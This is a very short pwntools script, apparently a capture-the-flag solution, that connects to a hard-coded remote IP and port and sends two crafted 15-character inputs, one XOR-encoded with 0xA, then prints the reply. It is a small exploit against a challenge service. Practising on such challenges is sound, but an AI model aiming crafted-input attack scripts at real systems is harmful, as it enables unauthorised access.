from pwn import *

r = remote('140.113.207.233', 8832)
r.recvuntil('...')
r.sendline(chr(ord('A') ^ 0xA) * 15)
r.sendline('A' * 15)
print(r.recvall(100))
